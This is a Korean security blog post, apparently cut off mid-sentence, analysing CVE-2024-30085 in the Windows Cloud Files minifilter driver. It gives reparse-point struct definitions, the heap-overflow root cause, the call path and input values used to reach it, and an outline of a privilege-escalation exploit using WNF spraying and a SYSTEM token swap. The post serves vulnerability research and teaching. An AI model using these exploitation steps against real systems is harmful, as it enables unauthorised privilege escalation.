&#xC18C;&#xAC1C;&#xB418;&#xC5C8;&#xB358; Windows Minifilter Driver &#xCDE8;&#xC57D;&#xC810;&#xC778;&#xB370;&#xC694;(<a href="https://hackyboiz.github.io/2025/01/11/OUYA77/2025-01-11/">reference</a>). CVE-2024-30085&#xB97C; &#xC9C1;&#xC811; &#xC7AC;&#xD604;&#xD574;&#xBCF4;&#xBA70; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xD568;&#xAED8; &#xC54C;&#xC544;&#xAC00;&#xBCF4;&#xB3C4;&#xB85D; &#xD569;&#xC2DC;&#xB2E4;.</p><blockquote><p><strong>&#x1FA9F; Environment : Windows 11 22h2/23h2 10.0.2261.3672</strong></p></blockquote><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image4.png" alt></p><p>Windows Cloud Files Mini Filter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; Windows &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xB3D9;&#xAE30;&#xD654; &#xAE30;&#xB2A5;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xC2DC;&#xB85C; &#xC9C0;&#xAE08; &#xC800;&#xC758; &#xD3F4;&#xB354;&#xB97C; &#xD558;&#xB098; &#xCC0D;&#xC5B4;&#xC654;&#xB294;&#xB370;&#xC694;, &#xC624;&#xB298;&#xC740; &#xD574;&#xB2F9; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBA3C;&#xC800; Stub File, Reparse Point&#xC5D0; &#xB300;&#xD55C; &#xC0AC;&#xC804; &#xACF5;&#xBD80;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="Stub-File&#xC774;&#xB780;"><a href="#Stub-File&#xC774;&#xB780;" class="headerlink" title="Stub File&#xC774;&#xB780;?"></a>Stub File&#xC774;&#xB780;?</h3><p>Stub File&#xC740; &#xB85C;&#xCEEC;&#xC5D0;&#xB294; &#xC2E4;&#xC81C;&#xB85C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC5C6;&#xACE0;, placeholder &#xD615;&#xD0DC;&#xB85C; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD30C;&#xC77C;&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;. &#xC704;&#xC758; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#x2018;&#xC0AC;&#xC9C4;&#x2019; &#xD3F4;&#xB354;&#xC5D0; &#xD30C;&#xB780;&#xC0C9; &#xAD6C;&#xB984; &#xC544;&#xC774;&#xCF58;&#xC774; status&#xB85C; &#xB098;&#xD0C0;&#xB098;&#xC788;&#xC8E0;? &#xBC14;&#xB85C; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC774; stub &#xC0C1;&#xD0DC;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC5B4;&#xC694;. NTFS &#xC0C1;&#xC5D0;&#xC11C; &#xD30C;&#xC77C; &#xD06C;&#xAE30;, &#xC774;&#xB984;, &#xC544;&#xC774;&#xCF58; &#xB4F1;&#xC740; &#xD45C;&#xC2DC;&#xD558;&#xC9C0;&#xB9CC;, &#xD30C;&#xC77C; &#xB0B4;&#xC6A9;&#xC740; &#xC804;&#xD600; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Reparse-Point-Metadata"><a href="#Reparse-Point-Metadata" class="headerlink" title="Reparse Point Metadata"></a>Reparse Point Metadata</h3><p>&#xADF8;&#xB7FC; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC774;&#xB7EC;&#xD55C; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xB420;&#xAE4C;&#xC694;!? NTFS&#xB294; Reparse Tag&#xB97C; &#xBCF4;&#xACE0; <strong>&#x201C;&#xC624;&#xD638;&#x2026; &#xC774;&#xAC74; stub file&#xC774;&#xB124;!&#x201D;</strong>&#xB77C;&#xACE0; &#xD310;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; Windows Cloud Files Minifilter(<code>cldflt.sys</code>)&#xAC00; &#xC774; <code>Reparse Point</code> &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC77D;&#xACE0;, &#xC774; &#xD30C;&#xC77C;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC98;&#xB9AC;&#xD560;&#xC9C0; &#xACB0;&#xC815;&#xD558;&#xB294; &#xAC83;&#xC774;&#xC8E0;.</p><p>&#xC774;&#xD6C4; Minifilter&#xC740; &#xC6D0;&#xACA9; &#xC11C;&#xBC84;&#xC640; &#xD1B5;&#xC2E0;&#xC744; &#xC900;&#xBE44;&#xD558;&#xB294;&#xB370;, <code>cldflt.sys</code>&#xB294; &#xC9C1;&#xC811; &#xC11C;&#xBC84;&#xC640; &#xD1B5;&#xC2E0;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. User-Mode &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC2E4;&#xC81C; &#xC791;&#xC5C5;&#xC744; &#xC704;&#xC784;&#xD574;&#xBC84;&#xB9AC;&#xB294;&#xB370;&#xC694;. &#xC704;&#xC5D0;&#xC11C; &#xBCF4;&#xC558;&#xB358; Minifilter&#xC774; I/O Interpreter &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0;, &#xC2E4;&#xC81C; &#xB370;&#xC774;&#xD130; &#xC870;&#xC791;&#xC740; User-Mode &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xB2F4;&#xB2F9;&#xD55C;&#xB2E4;&#xB294; &#xAC1C;&#xB150;&#xACFC; &#xC77C;&#xCE58;&#xD558;&#xC8E0;? (&#xC624;.. &#xC2E0;&#xAE30;&#xD558;&#xB124;&#xC694;.)</p><p>Windows Cloud Files Minifilter&#xC758; Reparse Point &#xAD6C;&#xC870;&#xCCB4;&#xB97C; Local Types&#xC5D0; &#xCD94;&#xAC00;&#xD588;&#xB294;&#xB370;&#xC694;, &#xC81C;&#xAC00; &#xC815;&#xC758;&#xD55C; CldFlt &#xAD6C;&#xC870;&#xCCB4; &#xC138;&#xD2B8;&#xB97C; &#xD568;&#xAED8; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">REPARSE_DATA_BUFFER</span> {</span>    DWORD ReparseTag;    WORD ReparseDataLength;    WORD Reserved;    WORD Flags;    WORD UncompressedSize;    REPARSE_CLD_BUFFER ReparseCldBuffer;} REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER;</code></pre><p>&#xBA3C;&#xC800; <code>REPARSE_DATA_BUFFER</code>&#xB294; NTFS&#xC758; &#xBAA8;&#xB4E0; Reparse Point &#xB370;&#xC774;&#xD130;&#xB97C; &#xD45C;&#xD604;&#xD558;&#xB294; &#xD45C;&#xC900; &#xD5E4;&#xB354; &#xAD6C;&#xC870;&#xCCB4;&#xC774;&#xC9C0;&#xB9CC;, &#xC5EC;&#xAE30;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xAD6C;&#xC870;&#xCCB4;&#xB294; Cloud Files&#xB97C; &#xC27D;&#xAC8C; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC7AC;&#xC815;&#xC758;&#xD55C; &#xBC84;&#xC804;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xAD6C;&#xC870;&#xCCB4;&#xB294; <code>ReparseTag</code>&#xB85C; &#xC18C;&#xC720; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC2DD;&#xBCC4;&#xD558;&#xACE0; <code>ReparseDataLength</code>, <code>Flags</code> &#xAC19;&#xC740; &#xCD5C;&#xC0C1;&#xC704; &#xBA54;&#xD0C0;&#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xC73C;&#xBA70;, &#xC2E4;&#xC81C; &#xB370;&#xC774;&#xD130;&#xB294; <code>HSM_REPARSE</code>&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_REPARSE</span></span><span class="hljs-class">{</span>    USHORT hsmFlags;    USHORT hsmSize;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_RP_DATA</span> <span class="hljs-title">fileData</span>;</span>};</code></pre><p><code>HSM_REPARSE</code>&#xB294; Cloud Files &#xC804;&#xC6A9; Reparse Point &#xC804;&#xCCB4; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC785;&#xB2C8;&#xB2E4;. <code>hsmFlags</code>&#xC640; <code>hsmSize</code>&#xB85C; &#xC555;&#xCD95; &#xC5EC;&#xBD80;&#xC640; HSM &#xBE14;&#xB85D; &#xC804;&#xCCB4; &#xD06C;&#xAE30;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xACE0;, <code>fileData</code> &#xD544;&#xB4DC;&#xC5D0; <code>HSM_RP_DATA</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_RP_DATA</span> </span><span class="hljs-class">{</span>           ULONG magic;    ULONG crc32;    ULONG totalSize;    USHORT dataFlags;    USHORT elemCount;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_RP_ELEMENT</span> <span class="hljs-title">elements</span>[5];</span>};</code></pre><p>&#xC774;&#xC5B4;&#xC11C; <code>HSM_RP_DATA</code> &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xBA54;&#xC778; &#xD5E4;&#xB354;&#xB85C;, &#xC804;&#xCCB4; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xBE14;&#xB85D;&#xC758; &#xAD6C;&#xC870;&#xC640; &#xC704;&#xCE58;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. magic&#xC744; &#xD1B5;&#xD574; &#xB370;&#xC774;&#xD130; &#xC885;&#xB958;&#xB97C; &#xC2DD;&#xBCC4;&#xD558;&#xACE0;, crc32&#xB97C; &#xD1B5;&#xD574; <code>dataFlags</code>&#xC5D0; CRC &#xC874;&#xC7AC; &#xBE44;&#xD2B8;&#xAC00; &#xC124;&#xC815;&#xB418;&#xBA74; <code>RtlComputeCrc32</code>&#xB85C; &#xAC80;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;. elements[] &#xBC30;&#xC5F4;&#xC5D0;&#xB294; <code>HSM_RP_ELEMENT</code> &#xAD6C;&#xC870;&#xCCB4;&#xB4E4;&#xC774; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xAC01; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xC694;&#xC18C;&#xC758; &#xC720;&#xD615;, &#xD06C;&#xAE30;, &#xC624;&#xD504;&#xC14B;&#xC744; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_RP_ELEMENT</span> </span><span class="hljs-class">{</span>                   USHORT elemType;    USHORT elemSize;    ULONG elemOffset;};<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> HSM_RP_ELEM_TYPE {    HSM_RP_ELEMENT_NONE   = <span class="hljs-number">0x00</span>,    HSM_RP_ELEMENT_U64    = <span class="hljs-number">0x06</span>,    HSM_RP_ELEMENT_BYTE   = <span class="hljs-number">0x07</span>,    HSM_RP_ELEMENT_U32    = <span class="hljs-number">0x0a</span>,    HSM_RP_ELEMENT_BITMAP = <span class="hljs-number">0x11</span>,    HSM_RP_ELEMENT_MAX    = <span class="hljs-number">0x12</span>} HSM_RP_ELEMENT_TYPE;</code></pre><p>&#xC774;&#xD6C4; <code>HSM_RP_ELEMENT</code>&#xC5D0;&#xC11C;&#xB294; &#xAC1C;&#xBCC4; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xC694;&#xC18C;&#xC758; type, size, offset&#xC744; &#xC815;&#xC758;&#xD558;&#xBA70;, <code>HSM_RP_ELEMENT_TYPE</code> &#xAC12;&#xC73C;&#xB85C; &#xC720;&#xD615;&#xC744; &#xAD6C;&#xBD84;&#xD558;&#xB294; &#xC591;&#xC0C1;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="2-1-Root-Cause-Analysis"><a href="#2-1-Root-Cause-Analysis" class="headerlink" title="2.1 Root Cause Analysis"></a>2.1 Root Cause Analysis</h2><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image5.png" alt></p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD574; <code>HsmFltPostCREATE</code> &#xCF5C;&#xBC31;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xC5B4; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC758; Reparse Point&#xB97C; &#xCC98;&#xB9AC;&#xD560; &#xB54C;,  <code>HsmFltPostCREATE</code> &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; Reparse Point&#xC5D0; &#xB2F4;&#xAE34; bitmap &#xC815;&#xBCF4;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>HsmIBitmapNORMALOpen()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><code>bitmap_size</code>&#xB294; User-Mode &#xC694;&#xCCAD; &#xBC84;&#xD37C;&#xC5D0;&#xC11C; &#xC77D;&#xC5B4;&#xC628; &#xAC12;&#xC785;&#xB2C8;&#xB2E4;.</li><li>&#xD06C;&#xAE30; 0x1000&#xC73C;&#xB85C; &#xACE0;&#xC815; &#xD560;&#xB2F9;&#xD55C; &#xBC84;&#xD37C; <code>ExAllocatePoolWithTag</code>&#xC5D0; &#xB300;&#xD574;, &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD55C; <code>bitmap_size</code>&#xB97C; &#xACBD;&#xACC4; &#xAC80;&#xC0AC; &#xC5C6;&#xC774; &#xADF8;&#xB300;&#xB85C; <code>memmove</code>&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xC5EC; &#xBCF5;&#xC0AC;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p>&#xB530;&#xB77C;&#xC11C; &#xB9CC;&#xC57D; <code>bitmap_size</code> &gt; 0x1000&#xC778; &#xACBD;&#xC6B0;, Heap-based Buffer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB420; &#xAC83;&#xC73C;&#xB85C; &#xC608;&#xC0C1;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image6.png" alt></p><p><code>HsmpBitmapIsReparseBufferSupported()</code> &#xD568;&#xC218;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; <code>hdr-&gt;elements[4].elemSize</code> &#xAC12;&#xC774; 0x1000&#xBCF4;&#xB2E4; &#xD06C;&#xBA74; &#xC624;&#xB958;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB294;&#xB370;&#xC694;. </p><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image7.png" alt></p><p>&#xC870;&#xAE08; &#xB354; &#xC704;&#xB85C; &#xC62C;&#xB77C;&#xAC00;&#xC11C; &#xC870;&#xAC74;&#xBB38; &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; <code>hdr-&gt;elements[2]</code>&#xB97C; &#xC5C4;&#xACA9;&#xD558;&#xAC8C; &#xAC80;&#xC99D;&#xD558;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>total &#x2265; 0x18</code>, <code>hdr&#x2192;elemCount</code> &#xB4F1;&#xC758; &#xACBD;&#xACC4; &#xCCB4;&#xD06C;&#xB97C; &#xBAA8;&#xB450; &#xD1B5;&#xACFC;&#xD574;&#xC57C; &#xC9C4;&#xD589;&#xC774; &#xB418;&#xB294;&#xAD70;&#xC694;.. &#xC774; &#xC870;&#xAC74;&#xC744; &#xCDA9;&#xC871;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xBA74; fail&#xC744; &#xBC18;&#xD658;&#xD558;&#xACA0;&#xC8E0;?</p><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image8.png" alt></p><p>&#xADF8;&#xB7F0;&#xB370; &#xB3D9;&#xC77C; &#xD568;&#xC218;&#xC5D0; <code>hasBuf</code>&#xAC00; false&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74;, &#xBCC4;&#xB3C4;&#xC758; &#xBE44;&#xD2B8;&#xB9F5; &#xAE38;&#xC774; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xACE0; <code>element[1]</code>&#xC758; 1&#xBC14;&#xC774;&#xD2B8; &#xD50C;&#xB798;&#xADF8;&#xB9CC; &#xD655;&#xC778;&#xD574;&#xB3C4; result = 0&#xC73C;&#xB85C; success&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACBD;&#xB85C;&#xC5D0;&#xC11C;&#xB294; &#xBE44;&#xD2B8;&#xB9F5;&#xC758; &#xAE38;&#xC774;&#xAC00; 0x1000&#xBCF4;&#xB2E4; &#xD070;&#xC9C0; &#xAC80;&#xC0AC;&#xAC00; &#xC218;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xAC80;&#xC99D;&#xC774; &#xAC74;&#xB108;&#xB6F0;&#xC5B4;&#xC9C0;&#xBA74;&#xC11C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC720;&#xD6A8;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xB418;&#xC5B4; &#xBC84;&#xB9BD;&#xB2C8;&#xB2E4;.</p><h2 id="2-2-Exploit"><a href="#2-2-Exploit" class="headerlink" title="2.2 Exploit"></a>2.2 Exploit</h2><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image9.png" alt></p><p>cldflt.sys &#xBBF8;&#xB2C8;&#xD544;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; I/O&#xB97C; &#xD6D1;&#xB294;&#xAC8C; &#xC544;&#xB2C8;&#xB77C;, CfAPI&#xB97C; &#xD1B5;&#xD55C; Sync Root &#xACBD;&#xB85C;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB9CC; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xBA3C;&#xC800; <code>CfRegisterSyncRoot()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xB3D9;&#xAE30;&#xD654; &#xD3F4;&#xB354;&#xC758; Root &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xB3C4;&#xB2EC;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image10.png" alt></p><p>Sync Root&#xB97C; &#xB4F1;&#xB85D;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC6B0;&#xC120; &#xBE4C;&#xB4DC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD574;&#xBCF4;&#xBA74; &#xC774;&#xB7F0; &#xD3F4;&#xB354;&#xAC00; &#xC0DD;&#xAE30;&#xB294;&#xB370;&#xC694;. &#xC774; &#xD3F4;&#xB354; &#xB0B4;&#xBD80;&#xC5D0;&#xB294; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; Stub File, &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xAC00; &#xC0DD;&#xAE38; &#xC218; &#xC788;&#xACE0;, &#xC81C;&#xAC00; &#xC774;&#xAC78; &#xC545;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xC9C0;&#xC810;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">-&gt; HsmFltPostCREATE()-&gt; HsmiFltPostECPCREATE()-&gt; HsmpSetupContexts()-&gt; HsmpCtxCreateStreamContext()-&gt; HsmIBitmapNORMALOpen()</code></pre><p>&#xB3D9;&#xC801; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD574;&#xBCF8; &#xACB0;&#xACFC;, &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xC778; <code>HsmIBitmapNORMALOpen()</code> &#xD568;&#xC218;&#xB85C; &#xC9C4;&#xC785;&#xD558;&#xB824;&#xBA74; &#xC704;&#xC640; &#xAC19;&#xC740; &#xD568;&#xC218; &#xCCB4;&#xC778;&#xC744; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xD1B5;&#xACFC;&#xD558;&#xBA74;&#xC11C; &#xC870;&#xAC74;&#xBB38;&#xC744; &#xBAA8;&#xB450; &#xCDA9;&#xC871;&#xD574;&#xC57C; &#xC9C4;&#xC785;&#xD560; &#xC218; &#xC788;&#xC74C;&#xC744; &#xC54C;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xC800;&#xC758; &#xBAA9;&#xD45C;&#xB294; &#xC870;&#xAC74;&#xC744; &#xBAA8;&#xB450; &#xCDA9;&#xC871;&#xD574;&#xC11C; <code>HsmIBitmapNORMALOpen()</code> &#xD568;&#xC218;&#xC758; &#xCDE8;&#xC57D;&#xD55C; <code>memmove</code>&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. </p><blockquote><p><strong>Minifilter Driver&#xB85C;&#xC11C;&#xC758; &#xD750;&#xB984; &#xC774;&#xD574;</strong></p></blockquote><p>&#xC55E;&#xC11C; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; I/O &#xC694;&#xCCAD;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC744; &#xB54C; IRP &#xCF54;&#xB4DC;&#xBCC4;&#xB85C; Callback&#xC744; &#xD638;&#xCD9C;&#xD55C;&#xB2E4;&#xACE0; &#xD588;&#xC8E0;? &#xCDE8;&#xC57D;&#xC810; &#xACBD;&#xB85C;&#xC5D0; &#xC9C4;&#xC785;&#xD558;&#xAE30; &#xC704;&#xD574; <code>IRP_MJ_CREATE</code>&#xC758; <code>Post-Create Callback</code>(<code>HsmFltPostCREATE</code>)&#xB97C; &#xC2DC;&#xC791;&#xC73C;&#xB85C; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xD568;&#xC218;&#xC5D0; &#xB3C4;&#xB2EC;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC911;&#xAC04; &#xD568;&#xC218;&#xB4E4;&#xC740; &#xD30C;&#xC77C;/&#xC2A4;&#xD2B8;&#xB9BC; &#xC18D;&#xC131;&#xACFC; Reparse Point &#xC815;&#xBCF4;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC9C4;&#xC785; &#xC870;&#xAC74;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xBBC0;&#xB85C;, &#xC800;&#xD76C;&#xB294; &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xD2B9;&#xC218;&#xD55C; &#xD30C;&#xC77C; &#xAD6C;&#xC870;&#xB97C; &#xB9CC;&#xB4E4;&#xBA74; &#xB418;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;!</p><ol><li><code>MakeDataBuffer()</code>&#xB85C; <code>IO_REPARSE_TAG_CLOUD</code> &#xAD6C;&#xC870; &#xC0DD;&#xC131; &#x2192; Minifilter&#xAC00; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC744; Cloud Stub File&#xB85C; &#xC778;&#xC2DD;&#xD574; Reparse Point &#xD30C;&#xC2F1; &#xB85C;&#xC9C1; &#xC9C4;&#xC785;.</li><li>Item Tag = <code>0x11</code>(Bitmap) &#x2192; <code>Size</code>&#xB97C; <code>0x1000 + overSize</code>&#xB85C; &#xC124;&#xC815;&#xD574; <code>memmove()</code>&#xC5D0;&#xC11C; &#xD560;&#xB2F9; &#xD06C;&#xAE30;&#xB97C; &#xCD08;&#xACFC;&#xD55C; &#xBCF5;&#xC0AC;(Heap Overflow) &#xC720;&#xBC1C;. &#xB2E4;&#xB978; &#xC694;&#xC18C;&#xB4E4;(Tag <code>0x7</code>, <code>0x6</code>, <code>0xA</code> &#xB4F1;)&#xB3C4; Minifilter&#xC758; &#xACBD;&#xACC4; &#xCCB4;&#xD06C;&#xB97C; &#xD1B5;&#xACFC;&#xD558;&#xB3C4;&#xB85D; &#xAC12; &#xC124;&#xC815;.</li><li>Overflow &#xB370;&#xC774;&#xD130;&#xC5D0; Fake &#xCEE4;&#xB110; &#xAC1D;&#xCCB4; &#xD3EC;&#xC778;&#xD130; &#xD3EC;&#xD568; &#x2192; <code>FSCTL_SET_REPARSE_POINT</code>&#xB85C; &#xC801;&#xC6A9; &#xD6C4; <code>CreateFile()</code> &#xD638;&#xCD9C; &#xC2DC; <code>HsmIBitmapNORMALOpen()</code> &#xC9C4;&#xC785;</li></ol><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image11.png" alt></p><p>&#xC870;&#xAC74;&#xC744; &#xCDA9;&#xC871;&#xD558;&#xBA74; FltMgr&#xB85C;&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD574; <code>HsmIBitmapNORMALOpen()</code>&#xC5D0; &#xC9C4;&#xC785;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>Exploit &#xACFC;&#xC815;&#xC744; &#xC804;&#xBD80; &#xB2F4;&#xACE0;&#xC2F6;&#xC9C0;&#xB9CC; &#xC624;&#xB298;&#xC740; Minifilter &#xC124;&#xBA85; &#xAE00;&#xC774;&#xACE0; &#xBC8C;&#xC368; &#xBD84;&#xB7C9; &#xC870;&#xC808;&#xC5D0; &#xC2E4;&#xD328;&#xD574;&#xBC84;&#xB9B0; &#xAC83; &#xAC19;&#xC73C;&#xB2C8;.. &#xC804;&#xCCB4; exploit &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xD55C;&#xBC88; &#xC694;&#xC57D;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image12.png" alt></p><blockquote><p><strong>Proof of Concept Overview</strong></p></blockquote><ol><li><strong>EPROCESS &#xAD6C;&#xC870; &#xBD84;&#xC11D; &#xBC0F; Token &#xD544;&#xB4DC; Offset &#xACC4;&#xC0B0;</strong><br>EPROCESS &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xC11C; Token &#xD544;&#xB4DC;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC744; &#xACC4;&#xC0B0;&#xD574; &#xC774;&#xD6C4; SYSTEM Token swap &#xC900;&#xBE44;.</li><li><strong>&#xCCAB; &#xBC88;&#xC9F8; <code>WNF_STATE_DATA</code> Spray &#xBC0F; Hole &#xC0DD;&#xC131;</strong><br>0x1000 &#xD06C;&#xAE30;(0xff0 &#xB370;&#xC774;&#xD130;)&#xC758; <code>WNF_STATE_DATA</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xB300;&#xB7C9;&#xC73C;&#xB85C; &#xC0DD;&#xC131;(spray)&#xD558;&#xACE0;, &#xD574;&#xC81C;&#xD574; &#xCEE4;&#xB110; 